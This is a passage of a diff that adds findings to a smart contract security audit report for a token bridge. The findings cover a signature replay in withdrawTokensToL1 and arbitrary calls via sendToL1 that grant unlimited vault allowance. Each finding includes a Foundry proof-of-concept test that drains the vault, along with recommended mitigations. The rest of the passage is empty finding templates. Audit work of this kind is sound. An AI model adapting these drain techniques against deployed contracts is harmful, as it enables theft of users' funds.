@@ -97,3 +97,173 @@ function depositTokensToL2(
 +        emit Deposit(l2Recipient, amount);
     }
 ```
+
+
+
+[H-3] TITLE (Root Cause -> Impact) Easy signature repay attack possible in the function `withdrawTokensToL1`.
+
+Description: When the user wants to withdraw token from L2 to L1,then the user sends some withdrawal data which is then signed by the operator of the contract which allows the execution of transfer, but an attacker can use the signature as many times he wants because there are no checks for reusing the signature like nonce.
+
+Impact: The attacker can drain out all the funds from the vault by using the signature again and again.
+
+Proof of Concept: 
+1. Attacker deposits some tokens in L2 by calling `depositTokensToL2`.
+2. Then attacker wants to withdraw the tokens from L2 so before the actual transfer, a message is signed by the operator.
+3. Attacker amount gets transfered, attacker again withdraws the amount by using the signature and then again, till the vault gets empty.
+
+Consider adding the below code in your `L1BossBridgeTest.t.sol`.
+
+<details>
+<summary>Proof of Code</summary>
+
+```javascript
+ function testSignatureReplayAttack() public {
+        Account memory boss = makeAccount("boss");
+        vm.prank(tokenBridge.owner());
+        tokenBridge.setSigner(boss.addr, true);
+        address attacker = makeAddr("attacker");
+        deal(address(token),attacker,100e18);
+        deal(address(token),address(vault),1000e18);
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge),type(uint256).max);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(attacker, attacker, 100e18);
+        tokenBridge.depositTokensToL2(attacker, attacker, 100e18);
+        bytes memory message = abi.encode(address(token),0, abi.encodeWithSelector(IERC20.transferFrom.selector,address(vault),attacker,100e18));
+        (uint8 v,bytes32 r,bytes32 s) = vm.sign(boss.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, 100e18, v, r, s);
+        }
+        assertEq(token.balanceOf(address(vault)),0);
+        assertEq(token.balanceOf(attacker),1100e18);
+        vm.stopPrank();
+    }
+```
+
+</details>
+
+Recommended Mitigation: Consider redesigning the withdrawal mechanism so that it includes replay protection, like using some nonce and some checks as well.
+
+
+
+
+
+
+[S-#] TITLE (Root Cause -> Impact) `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds
+
+Description: The function `sendToL1` in the contract allows arbitrary calls as we know that attacker can reuse the signature and through `sendToL1` by submitting the signature attacker can call the function `approveTo` in the contract `L1Vault` and get allowance of the whole protocol including draining all the funds from the vault.
+
+```javascript
+function sendToL1(
+        uint8 v,
+        bytes32 r,
+        bytes32 s,
+        bytes memory message
+    ) public nonReentrant whenNotPaused {
+        address signer = ECDSA.recover(
+            MessageHashUtils.toEthSignedMessageHash(keccak256(message)),
+            v,
+            r,
+            s
+        );
+
+        if (!signers[signer]) {
+            revert L1BossBridge__Unauthorized();
+        }
+
+        (address target, uint256 value, bytes memory data) = abi.decode(
+            message,
+            (address, uint256, bytes)
+        );
+
+@>        (bool success, ) = target.call{value: value}(data);
+        if (!success) {
+            revert L1BossBridge__CallFailed();
+        }
+    }
+```
+
+Impact: Attacker can get allowance of the whole contract and can easily drain all the funds from the contract.
+
+Proof of Concept: Consider including the following test in the `L1BossBridge.t.sol` file:
+
+<details>
+<summary>Proof of Code</summary>
+
+```javascript
+ function testCanCallVaultApproveFromBridgeAndDrainVault() public {
+        Account memory boss = makeAccount("boss");
+        vm.prank(tokenBridge.owner());
+        tokenBridge.setSigner(boss.addr, true);
+        address attacker = makeAddr("attacker");
+        deal(address(token),attacker,100e18);
+        deal(address(token),address(vault),1000e18);
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge),type(uint256).max);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(attacker, attacker, 100e18);
+        tokenBridge.depositTokensToL2(attacker, attacker, 100e18);
+        bytes memory message = abi.encode(address(vault),0, abi.encodeCall(L1Vault.approveTo,(address(attacker),type(uint256).max)));
+        (uint8 v,bytes32 r,bytes32 s) = vm.sign(boss.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        tokenBridge.sendToL1(v, r, s, message);
+        token.transferFrom(address(vault),attacker,token.balanceOf(address(vault)));
+        assertEq(token.balanceOf(attacker),1100e18);
+        vm.stopPrank();
+    }
+```
+
+</details>
+
+Recommended Mitigation: Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.
+
+
+
+
+
+
+
+
+[S-#] TITLE (Root Cause -> Impact)
+
+Description:
+
+Impact:
+
+Proof of Concept:
+
+Recommended Mitigation:
+
+
+
+
+
+
+
+
+
+[S-#] TITLE (Root Cause -> Impact)
+
+Description:
+
+Impact:
+
+Proof of Concept:
+
+Recommended Mitigation:
+
+
+
+
+
+
+
+
+[S-#] TITLE (Root Cause -> Impact)
+
+Description:
+
+Impact:
+
+Proof of Concept:
+
+Recommended Mitigation:
